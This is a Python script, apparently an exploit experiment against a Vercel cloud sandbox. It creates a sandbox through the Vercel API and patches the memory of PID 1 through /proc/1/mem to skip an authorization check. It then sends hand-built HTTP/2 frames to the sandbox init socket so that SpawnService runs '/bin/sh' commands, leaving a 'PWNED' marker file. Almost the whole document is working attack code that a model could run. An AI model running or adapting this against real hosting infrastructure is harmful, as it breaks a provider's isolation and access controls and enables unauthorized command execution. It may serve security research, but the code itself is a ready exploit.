# -*- coding: utf-8 -*-
"""实验J271: h2 帧完整解析 - 确认免签调用结果
A: patch 前 bg Ping -> resp1 (timeout 15s, 确认 hang/拒/杀)
C: patch
D: patch 后 bg Ping -> resp2 + 帧解析 -> p2.txt
E: patch 后 bg Spawn -> resp3 + 帧解析 -> p3.txt
"""
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=280):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    t0 = time.time()
    for attempt in range(4):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        if c == 410 or "sandbox_stopped" in r:
            print(f"  SANDBOX_DEAD at cmd[{label}]", flush=True)
            return "DEAD"
        time.sleep(3)
    dt = time.time() - t0
    print(f"=== cmd[{label}] status {c} wall={dt:.1f}s ===", flush=True)
    out = ""
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return "DEAD" if "sandbox_stopped" in r else ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                out += d.get("data", "")
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    if out:
        print(out, flush=True)
    return out

# 后台探针: h2 请求 + 帧解析 -> 文本报告
BG_PROBE = r'''
import socket, struct, base64, time, json as _j

def parse_h2(data):
    out = []
    i = 0
    while i + 9 <= len(data):
        ln = int.from_bytes(data[i:i+3], "big")
        t = data[i+3]; fl = data[i+4]
        sid = int.from_bytes(data[i+5:i+9], "big") & 0x7fffffff
        payload = data[i+9:i+9+ln]
        out.append("FRAME type=%d flags=0x%02x sid=%d len=%d" % (t, fl, sid, ln))
        if t == 0:
            out.append("  DATA: %r" % payload[:300])
        elif t == 1:
            hp = payload
            if fl & 0x8:
                padlen = hp[0]
                hp = hp[1:len(hp)-padlen]
            out.append("  HPACK: %r" % hp[:300])
        elif t == 3:
            out.append("  RST err=%d" % int.from_bytes(payload[:4], "big"))
        elif t == 7:
            out.append("  GOAWAY last=%d err=%d debug=%r" % (
                int.from_bytes(payload[:4], "big"),
                int.from_bytes(payload[4:8], "big"), payload[8:60]))
        elif t == 4:
            out.append("  SETTINGS: %r" % payload[:100])
        out.append("")
        i += 9 + ln
    if i < len(data):
        out.append("TRAIL: %r" % data[i:])
    return "\n".join(out)

def h2_request(path, body, rawfile, txtfile, timeout=12):
    try:
        sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect("/run/vercel/share/init.sock")
        sock.sendall(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n")
        def fr(t, flags, sid, payload):
            return struct.pack(">I", len(payload))[:3] + bytes([t, flags]) + struct.pack(">I", sid & 0x7fffffff) + payload
        sock.sendall(fr(4, 0, 0, b""))
        headers = (
            b":method: POST\r\n:scheme: http\r\n:path: " + path + b"\r\n:authority: init\r\n"
            b"content-type: application/json\r\nconnect-protocol-version: 1\r\n"
            b"content-length: " + str(len(body)).encode() + b"\r\n"
        )
        hp = base64.b64encode(headers)
        sock.sendall(fr(1, 0x4, 1, b"\x00" + hp))
        sock.sendall(fr(0, 0x1, 1, body))
        data = b""
        note = ""
        try:
            while True:
                d = sock.recv(4096)
                if not d:
                    break
                data += d
                if len(data) > 60000:
                    break
        except socket.timeout:
            note = "TIMEOUT"
        except Exception as e:
            note = "ERR %s: %s" % (type(e).__name__, e)
        sock.close()
        open(rawfile, "wb").write(data)
        rep = parse_h2(data) + "\nNOTE: " + note
        open(txtfile, "w").write(rep)
        return len(data)
    except Exception as e:
        open(txtfile, "w").write("EXC %s: %s" % (type(e).__name__, e))
        return -1

# 用法: python3 bg.py <path> <body> <rawfile> <txtfile>
import sys
path = sys.argv[1].encode()
body = sys.argv[2].encode()
rawf = sys.argv[3]
txtf = sys.argv[4]
h2_request(path, body, rawf, txtf)
'''

NAME = "expj271"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME})
print("create:", c, flush=True)
if c != 200:
    print(r[:400], flush=True)
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid, flush=True)

BG_INSTALL = r'''
import subprocess
open("/tmp/bg.py", "w").write(%r)
def bg(path, body, rawf, txtf, outlog):
    r = subprocess.Popen(
        ["setsid", "nohup", "python3", "/tmp/bg.py", path, body, rawf, txtf],
        stdout=open(outlog, "w"), stderr=subprocess.STDOUT,
        stdin=subprocess.DEVNULL, close_fds=True,
    )
    return r.pid
print("INSTALLED", flush=True)
''' % BG_PROBE

# A: 安装 + patch 前 Ping (timeout 15s 在 bg 内)
CODE_A = BG_INSTALL + r'''
pid = bg("/vercel.sandbox.spawn.v1.SpawnService/Ping", "{}", "/tmp/r1.bin", "/tmp/r1.txt", "/tmp/bg1.log")
print("bg1 pid", pid, flush=True)
'''
run_cmd(sid, CODE_A, "A_INSTALL_BG1", timeout=100)

# B: 15 秒后检查 resp1 (patch 前)
time.sleep(16)
CODE_B = r'''
import os
print("r1.txt exists:", os.path.exists("/tmp/r1.txt"), flush=True)
if os.path.exists("/tmp/r1.txt"):
    print(open("/tmp/r1.txt").read()[:1500], flush=True)
print("bg1 alive:", os.path.exists("/proc/%s" % open("/tmp/bg1.pid").read().strip()) if os.path.exists("/tmp/bg1.pid") else "n/a", flush=True)
'''
rB = run_cmd(sid, CODE_B, "B_CHECK1", timeout=100)

# C: patch
CODE_C = r'''
import os
fd = os.open("/proc/1/mem", os.O_RDWR)
def ra(a, n):
    os.lseek(fd, a, 0)
    return os.read(fd, n)
def wa(a, b):
    os.lseek(fd, a, 0)
    return os.write(fd, b)
old = ra(0x77bb83, 5)
print("OLD", old.hex(), flush=True)
if old == bytes.fromhex("e8f841e2ff"):
    wa(0x77bb83, bytes.fromhex("31c0909090"))
    print("PATCHED", ra(0x77bb83, 5).hex(), flush=True)
else:
    print("PATTERN_DIFF", old.hex(), flush=True)
os.close(fd)
'''
rC = run_cmd(sid, CODE_C, "C_PATCH", timeout=100)
print("C PATCHED:", "PATCHED" in (rC or ""), flush=True)

if "PATCHED" in (rC or ""):
    # D: patch 后 Ping
    CODE_D = r'''
import subprocess
def bg(path, body, rawf, txtf, outlog):
    r = subprocess.Popen(
        ["setsid", "nohup", "python3", "/tmp/bg.py", path, body, rawf, txtf],
        stdout=open(outlog, "w"), stderr=subprocess.STDOUT,
        stdin=subprocess.DEVNULL, close_fds=True,
    )
    return r.pid
pid = bg("/vercel.sandbox.spawn.v1.SpawnService/Ping", "{}", "/tmp/r2.bin", "/tmp/r2.txt", "/tmp/bg2.log")
print("bg2 pid", pid, flush=True)
'''
    run_cmd(sid, CODE_D, "D_BG2", timeout=100)
    time.sleep(8)
    CODE_E = r'''
import os
print("r2.txt exists:", os.path.exists("/tmp/r2.txt"), flush=True)
if os.path.exists("/tmp/r2.txt"):
    print(open("/tmp/r2.txt").read()[:2000], flush=True)
'''
    rE = run_cmd(sid, CODE_E, "E_CHECK2", timeout=100)

    # F: patch 后 Spawn
    CODE_F = r'''
import subprocess
def bg(path, body, rawf, txtf, outlog):
    r = subprocess.Popen(
        ["setsid", "nohup", "python3", "/tmp/bg.py", path, body, rawf, txtf],
        stdout=open(outlog, "w"), stderr=subprocess.STDOUT,
        stdin=subprocess.DEVNULL, close_fds=True,
    )
    return r.pid
pid = bg("/vercel.sandbox.spawn.v1.SpawnService/Spawn", '{"command":"/bin/sh","args":["-c","id; echo PWNED > /tmp/spawn_marker.txt"],"env":{}}', "/tmp/r3.bin", "/tmp/r3.txt", "/tmp/bg3.log")
print("bg3 pid", pid, flush=True)
'''
    run_cmd(sid, CODE_F, "F_BG3", timeout=100)
    time.sleep(8)
    CODE_G = r'''
import os
print("r3.txt exists:", os.path.exists("/tmp/r3.txt"), flush=True)
if os.path.exists("/tmp/r3.txt"):
    print(open("/tmp/r3.txt").read()[:2000], flush=True)
print("spawn_marker:", os.path.exists("/tmp/spawn_marker.txt"), flush=True)
if os.path.exists("/tmp/spawn_marker.txt"):
    print("marker:", open("/tmp/spawn_marker.txt").read()[:200], flush=True)
'''
    rG = run_cmd(sid, CODE_G, "G_CHECK3", timeout=100)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
